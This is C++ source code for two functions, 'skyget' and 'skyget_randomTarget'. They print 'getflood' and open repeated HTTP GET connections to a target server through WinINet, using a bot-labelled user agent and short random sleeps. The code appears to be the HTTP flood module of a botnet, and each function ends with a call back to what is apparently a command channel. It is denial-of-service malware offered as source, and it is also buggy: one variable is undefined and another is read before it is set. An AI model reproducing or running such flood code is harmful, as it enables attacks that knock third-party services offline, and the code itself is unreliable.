int skyget(string target,string length){
	cout<<"getflood\n";
int count=target.find("/");
	string server=target.substr(0,count);
	string location=target.substr(count);
	cout<<server<<endl;
	cout<<location<<endl;
	int c0unt=atoi(length.c_str());
for(int i=0;i<c0unt;i++){
	cout<<"connection number:"<<i<<"\n";
	HINTERNET Internet, Conn, Req;
	Internet=InternetOpen("\\/\\/bot:skyget",INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL,0);
if (Internet==NULL)
	 {
		 
		 return 1;
	 }
     Conn=InternetConnect(Internet,server.c_str(),INTERNET_DEFAULT_HTTP_PORT,NULL,NULL,INTERNET_SERVICE_HTTP,0,0);
          if (Conn==NULL)
		  {
			  
			  return 2;
		  }
		 

			 Req=HttpOpenRequest(Conn,"GET",location.c_str(), NULL, NULL, NULL, INTERNET_FLAG_KEEP_CONNECTION, 0);
			 if (Req==NULL)
				{
		
			    return 3;
				}
			HttpSendRequest(Req,NULL,0,NULL,0);
				char comm[1000000];
				DWORD read;
		
				string command;
				bool b00l;
		
				while(b00l)
				   {
				    b00l = InternetReadFile(Req,comm,10000,&read);
		   
			    if(b00l && read == 0) break; 
				}
				Sleep(rand()%250);
 

				InternetCloseHandle(Internet);}  
connect(1);
}


int skyget_randomTarget(string target,string length){
	cout<<"getflood\n";
int count=target.find("/");
	string server=target.substr(0,count);
	
	cout<<server<<endl;
	cout<<location<<endl;
	int c0unt=atoi(length.c_str());
for(int i=0;i<c0unt;i++){
	cout<<"connection number:"<<i<<"\n";
	HINTERNET Internet, Conn, Req;
	Internet=InternetOpen("\\/\\/bot:skyget",INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL,0);
if (Internet==NULL)
	 {
		 
		 return 1;
	 }
     Conn=InternetConnect(Internet,server.c_str(),INTERNET_DEFAULT_HTTP_PORT,NULL,NULL,INTERNET_SERVICE_HTTP,0,0);
          if (Conn==NULL)
		  {
			  
			  return 2;
		  }
		 

			 Req=HttpOpenRequest(Conn,"GET",location.c_str(), NULL, NULL, NULL, INTERNET_FLAG_KEEP_CONNECTION, 0);
			 if (Req==NULL)
				{
		
			    return 3;
				}
			HttpSendRequest(Req,NULL,0,NULL,0);
				char comm[1000000];
				DWORD read;
		
				string command;
				bool b00l;
		
				while(b00l)
				   {
				    b00l = InternetReadFile(Req,comm,10000,&read);
		   
			    if(b00l && read == 0) break; 
				}
				Sleep(rand()%250);
 

				InternetCloseHandle(Internet);}  
connect(1);}